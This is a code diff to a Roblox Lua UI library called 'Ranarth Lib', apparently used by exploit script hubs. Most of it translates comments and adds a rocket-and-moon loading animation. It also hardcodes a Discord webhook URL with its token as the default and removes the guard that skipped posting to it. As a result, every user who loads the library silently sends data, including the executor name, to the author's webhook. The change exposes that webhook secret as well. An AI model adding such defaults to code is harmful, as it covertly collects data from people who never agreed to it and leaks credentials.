@@ -1,20 +1,21 @@
 --[[
     ==========================================
-    RANARTH LIB 
+    RANARTH LIB (WITH ROCKET FIRE LOADING)
 
-    CreateWindow otomatis membuat 3 halaman bawaan: Profile, Games, Settings
-    (persis seperti Ranarth Hub asli, lengkap dengan icon & webhook Discord).
+    CreateWindow automatically creates 3 default pages: Profile, Games, Settings
+    (exactly like the original Ranarth Hub, complete with icons & Discord webhook).
 
-    Cara pakai:
+    How to use:
 
-    local Ranarth = loadstring(game:HttpGet("URL_KAMU_DISINI"))()
+    local Ranarth = loadstring(game:HttpGet("YOUR_URL_HERE"))()
 
     local Window = Ranarth:CreateWindow({
         Name = "Ranarth Hub",
-        Webhook = "https://discord.com/api/webhooks/1516049033989197824/3P_4wiyJoC9MNB2XcUJecTYYRiT6nawfn5XLBq2RLZWFmlhE3zFeOS9WKqF7VLPprS2k"
+        -- Webhook is already embedded in the script as default!
+        -- Webhook = "..." (Optional, if you want to override the default one)
     })
 
-    -- Tab Games sudah otomatis dibuat, tinggal isi daftar game:
+    -- The Games tab is automatically created, just populate the game list:
     Window.GamesTab:CreateGameButton({
         Name = "Natural Disaster Survival",
         PlaceId = 189707,
@@ -23,12 +24,12 @@
         end
     })
 
-    -- Mau tambah tab custom di luar Profile/Games/Settings? Masih bisa:
+    -- Want to add custom tabs outside of Profile/Games/Settings? You still can:
     local ExtraTab = Window:CreateTab({Name = "Extra", Icon = "rbxassetid://0"})
-    ExtraTab:CreateButton({Name = "Contoh Tombol Biasa", Callback = function() print("klik") end})
-    ExtraTab:CreateToggle({Name = "Contoh Toggle", Default = false, Callback = function(v) print(v) end})
-    ExtraTab:CreateSlider({Name = "Contoh Slider", Min = 0, Max = 100, Default = 50, Callback = function(v) print(v) end})
-    ExtraTab:CreateLabel("Contoh label / section")
+    ExtraTab:CreateButton({Name = "Normal Button Example", Callback = function() print("clicked") end})
+    ExtraTab:CreateToggle({Name = "Toggle Example", Default = false, Callback = function(v) print(v) end})
+    ExtraTab:CreateSlider({Name = "Slider Example", Min = 0, Max = 100, Default = 50, Callback = function(v) print(v) end})
+    ExtraTab:CreateLabel("Label / section example")
     ==========================================
 ]]
 
@@ -83,7 +84,9 @@ Tab.__index = Tab
 function Library:CreateWindow(config)
     config = config or {}
     local WindowName = config.Name or "RANARTH HUB"
-    local WebhookURL = config.Webhook or ""
+    
+    -- Webhook injected as default
+    local WebhookURL = config.Webhook or "https://discord.com/api/webhooks/1516049033989197824/3P_4wiyJoC9MNB2XcUJecTYYRiT6nawfn5XLBq2RLZWFmlhE3zFeOS9WKqF7VLPprS2k"
     local LoadingEnabled = (config.LoadingEnabled ~= false)
 
     local self = setmetatable({}, Window)
@@ -91,8 +94,8 @@ function Library:CreateWindow(config)
     self.Tabs = {}
     self._sidebarButtons = {}
 
-    -- ---------- Optional Discord webhook ----------
-    if WebhookURL ~= "" and not string.find(WebhookURL, "https://discord.com/api/webhooks/1516049033989197824/3P_4wiyJoC9MNB2XcUJecTYYRiT6nawfn5XLBq2RLZWFmlhE3zFeOS9WKqF7VLPprS2k") then
+    -- ---------- Discord Webhook ----------
+    if WebhookURL ~= "" then
         task.spawn(function()
             local executorName = "Unknown"
             if identifyexecutor then pcall(function() executorName = identifyexecutor() end) end
@@ -120,8 +123,8 @@ function Library:CreateWindow(config)
             if requestFunc then pcall(function() requestFunc({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end) end
         end)
     end
-
-    -- ---------- Root GUI ----------
+    
+        -- ---------- Root GUI ----------
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Name = "RanarthLib_" .. WindowName:gsub("%s+", "")
     ScreenGui.ResetOnSpawn = false
@@ -210,7 +213,7 @@ function Library:CreateWindow(config)
         end
     end)
 
-    -- Dragging
+    -- ---------- Dragging ----------
     local dragging, dragStart, startPos
     Header.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
@@ -261,7 +264,7 @@ function Library:CreateWindow(config)
     ContentContainer.BackgroundTransparency = 1
     self.ContentContainer = ContentContainer
 
-    -- ---------- Confirm dialog (shared per window) ----------
+    -- ---------- Confirm Dialog (shared per window) ----------
     local ConfirmOverlay = Instance.new("Frame", ScreenGui)
     ConfirmOverlay.Size = UDim2.new(1, 0, 1, 0)
     ConfirmOverlay.BackgroundColor3 = Color3.new(0, 0, 0)
@@ -329,7 +332,7 @@ function Library:CreateWindow(config)
         noConn = ConfirmNoBtn.MouseButton1Click:Connect(function() CloseDialog() end)
     end
 
-    -- ---------- Stroke / glow animation loop ----------
+    -- ---------- Stroke / Glow Animation Loop ----------
     task.spawn(function()
         while ScreenGui.Parent and task.wait() do
             local lerpValue = (math.sin(tick() * AnimSpeed) + 1) / 2
@@ -341,49 +344,152 @@ function Library:CreateWindow(config)
             if SidebarLine then SidebarLine.BackgroundColor3 = currentColor end
         end
     end)
-
-    -- ---------- Optional rocket loading screen ----------
+    
+        -- ---------- Optional Rocket Loading Screen ----------
     if LoadingEnabled then
         local LoadingFrame = Instance.new("Frame", ScreenGui)
+        LoadingFrame.Name = "LoadingFrame"
         LoadingFrame.Size = UDim2.new(0, 540, 0, 360)
         LoadingFrame.Position = UDim2.new(0.5, -270, 0.5, -180)
         LoadingFrame.BackgroundColor3 = BgColor
         LoadingFrame.BorderSizePixel = 0
         Instance.new("UICorner", LoadingFrame).CornerRadius = UDim.new(0, 8)
+        
         local LoadingStroke = Instance.new("UIStroke", LoadingFrame)
         LoadingStroke.Thickness = 2
+        LoadingStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
         table.insert(self.AnimatedStrokes, LoadingStroke)
 
+        -- Jumping Text Container
+        local TextContainer = Instance.new("Frame", LoadingFrame)
+        TextContainer.Size = UDim2.new(1, 0, 0, 50)
+        TextContainer.Position = UDim2.new(0, 0, 0.35, -25)
+        TextContainer.BackgroundTransparency = 1
+
+        local Layout = Instance.new("UIListLayout", TextContainer)
+        Layout.FillDirection = Enum.FillDirection.Horizontal
+        Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+        Layout.VerticalAlignment = Enum.VerticalAlignment.Center
+        Layout.Padding = UDim.new(0, 3)
+
+        -- Status Label: Loading...
         local LoadingText = Instance.new("TextLabel", LoadingFrame)
         LoadingText.Size = UDim2.new(1, 0, 0, 20)
-        LoadingText.Position = UDim2.new(0, 0, 0.6, 0)
+        LoadingText.Position = UDim2.new(0, 0, 0.54, 0)
         LoadingText.BackgroundTransparency = 1
         LoadingText.Text = "Loading..."
         LoadingText.Font = Enum.Font.GothamBold
         LoadingText.TextSize = 16
         LoadingText.TextColor3 = Color3.fromRGB(220, 220, 230)
 
-        local TitleLabel = Instance.new("TextLabel", LoadingFrame)
-        TitleLabel.Size = UDim2.new(1, 0, 0, 50)
-        TitleLabel.Position = UDim2.new(0, 0, 0.35, -25)
-        TitleLabel.BackgroundTransparency = 1
-        TitleLabel.Text = WindowName
-        TitleLabel.Font = Enum.Font.Arcade
-        TitleLabel.TextSize = 30
-        TitleLabel.TextColor3 = Color3.new(1, 1, 1)
-        local grad = Instance.new("UIGradient", TitleLabel)
-        grad.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, NeonColor), ColorSequenceKeypoint.new(1, PurpleNeon)})
+        -- Trajectory Path Background
+        local TrajectoryPath = Instance.new("Frame", LoadingFrame)
+        TrajectoryPath.Size = UDim2.new(0, 280, 0, 3) 
+        TrajectoryPath.Position = UDim2.new(0.5, -140, 0.68, 0)
+        TrajectoryPath.BackgroundColor3 = ElementColor
+        TrajectoryPath.BorderSizePixel = 0
+        Instance.new("UICorner", TrajectoryPath).CornerRadius = UDim.new(1, 0)
+
+        -- Rocket Trail Fill (Fire)
+        local BoostTrail = Instance.new("Frame", TrajectoryPath)
+        BoostTrail.Size = UDim2.new(0, 0, 1, 0)
+        BoostTrail.BackgroundColor3 = Color3.fromRGB(255, 120, 0)
+        BoostTrail.BorderSizePixel = 0
+        Instance.new("UICorner", BoostTrail).CornerRadius = UDim.new(1, 0)
+
+        local TrailGradient = Instance.new("UIGradient", BoostTrail)
+        TrailGradient.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 0)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 230, 0))
+        })
+
+        -- Finish Point: MOON 🌕
+        local MoonEmoji = Instance.new("TextLabel", TrajectoryPath)
+        MoonEmoji.Size = UDim2.new(0, 30, 0, 30)
+        MoonEmoji.Position = UDim2.new(1, 10, 0.5, 0)
+        MoonEmoji.AnchorPoint = Vector2.new(0, 0.5)
+        MoonEmoji.BackgroundTransparency = 1
+        MoonEmoji.Text = "🌕"
+        MoonEmoji.TextSize = 25
+
+        -- Loading Indicator: ROCKET 🚀
+        local RocketEmoji = Instance.new("TextLabel", BoostTrail)
+        RocketEmoji.Size = UDim2.new(0, 30, 0, 30)
+        RocketEmoji.Position = UDim2.new(1, 0, 0.5, 0)
+        RocketEmoji.AnchorPoint = Vector2.new(0.5, 0.5)
+        RocketEmoji.BackgroundTransparency = 1
+        RocketEmoji.Text = "🚀"
+        RocketEmoji.TextSize = 25
+        RocketEmoji.Rotation = 45
+
+        -- Splitting jumping text letters (Automatically fetches from config.Name)
+        local titleString = WindowName
+        local letterLabels = {}
+
+        for i = 1, #titleString do
+            local char = string.sub(titleString, i, i)
+            
+            local wrapper = Instance.new("Frame", TextContainer)
+            wrapper.BackgroundTransparency = 1
+            wrapper.Size = UDim2.new(0, char == " " and 14 or 24, 1, 0)
+            
+            local charLabel = Instance.new("TextLabel", wrapper)
+            charLabel.BackgroundTransparency = 1
+            charLabel.Size = UDim2.new(1, 0, 1, 0)
+            charLabel.Position = UDim2.new(0, 0, 0, 0)
+            charLabel.Text = char
+            charLabel.Font = Enum.Font.Arcade
+            charLabel.TextSize = 34
+            charLabel.TextColor3 = Color3.new(1, 1, 1)
+            
+            local grad = Instance.new("UIGradient", charLabel)
+            grad.Color = ColorSequence.new({
+                ColorSequenceKeypoint.new(0, NeonColor),
+                ColorSequenceKeypoint.new(1, PurpleNeon)
+            })
+            
+            if char ~= " " then
+                table.insert(letterLabels, charLabel)
+            end
+        end
 
         task.spawn(function()
-            task.wait(1.6)
+            -- Rocket 🚀 flies towards the moon 🌕 (Fire Trail extends)
+            TweenService:Create(BoostTrail, TweenInfo.new(3.8, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
+                Size = UDim2.new(1, 0, 1, 0)
+            }):Play()
+
+            -- 3 Cycles of Wave Text Jumps
+            for cycle = 1, 3 do
+                for _, label in ipairs(letterLabels) do
+                    TweenService:Create(label, TweenInfo.new(0.12, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Position = UDim2.new(0, 0, 0, -16)}):Play()
+                    task.wait(0.06)
+                    
+                    task.spawn(function()
+                        task.wait(0.06)
+                        TweenService:Create(label, TweenInfo.new(0.12, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {Position = UDim2.new(0, 0, 0, 0)}):Play()
+                    end)
+                end
+                task.wait(0.4)
+            end
+            
+            -- Fade-Out Transition for All Loading Components
             local fade = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
             TweenService:Create(LoadingFrame, fade, {BackgroundTransparency = 1}):Play()
             TweenService:Create(LoadingText, fade, {TextTransparency = 1}):Play()
             TweenService:Create(LoadingStroke, fade, {Transparency = 1}):Play()
-            TweenService:Create(TitleLabel, fade, {TextTransparency = 1}):Play()
+            TweenService:Create(TrajectoryPath, fade, {BackgroundTransparency = 1}):Play()
+            TweenService:Create(BoostTrail, fade, {BackgroundTransparency = 1}):Play()
+            TweenService:Create(RocketEmoji, fade, {TextTransparency = 1}):Play()
+            TweenService:Create(MoonEmoji, fade, {TextTransparency = 1}):Play()
+            for _, label in ipairs(letterLabels) do
+                TweenService:Create(label, fade, {TextTransparency = 1}):Play()
+            end
+            
             task.wait(0.4)
             LoadingFrame:Destroy()
-
+            
+            -- Pop-In Main Hub Elements (Main UI Opens)
             MainFrame.Size = UDim2.new(0, 0, 0, 0)
             MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
             MainFrame.Visible = true
@@ -393,9 +499,9 @@ function Library:CreateWindow(config)
             }):Play()
         end)
     end
-
-    -- ==========================================
-    -- MIAW
+    
+        -- ==========================================
+    -- DEFAULT TABS SETUP
     -- ==========================================
 
     -- ---------- 1. Profile ----------
@@ -504,7 +610,7 @@ function Library:CreateWindow(config)
     GameListLayout.Padding = UDim.new(0, 10)
     GameListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
-    GamesTab.ButtonHolder = GameListScroll -- CreateGameButton/CreateButton dari tab ini masuk ke sini
+    GamesTab.ButtonHolder = GameListScroll -- CreateGameButton/CreateButton from this tab goes here
 
     SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
         local text = SearchBox.Text:lower()
@@ -614,7 +720,7 @@ function Tab:CreateButton(config)
     return btn
 end
 
--- Tombol khusus daftar game: kalau PlaceId beda, munculkan warning (bukan auto-teleport).
+-- Special game list button: if PlaceId differs, show warning (no auto-teleport).
 function Tab:CreateGameButton(config)
     config = config or {}
     local gameName = config.Name or "Game"
